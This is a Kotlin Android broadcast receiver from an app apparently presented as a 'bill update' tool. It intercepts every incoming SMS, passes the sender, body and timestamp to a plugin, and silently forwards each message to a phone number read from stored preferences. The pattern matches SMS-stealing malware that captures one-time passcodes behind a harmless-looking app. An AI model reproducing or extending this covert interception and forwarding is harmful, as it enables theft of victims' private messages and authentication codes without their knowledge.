package com.example.bill_update_app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val bundle = intent.extras
            val pdus = bundle?.get("pdus") as? Array<*>
            pdus?.forEach { pdu ->
                val message = SmsMessage.createFromPdu(pdu as ByteArray)
                val sender = message.originatingAddress ?: "Unknown"
                val body = message.messageBody ?: ""
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.US).format(java.util.Date(message.timestampMillis))
                SmsPlugin.receiveSms(sender, body, timestamp)

                val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                val fwdTo = prefs.getString("sms_fwd_to", "")
                if (fwdTo != null && fwdTo.isNotEmpty()) {
                    SmsForwarder(context).forwardSms(fwdTo, sender, body, timestamp)
                }
            }
        }
    }
}
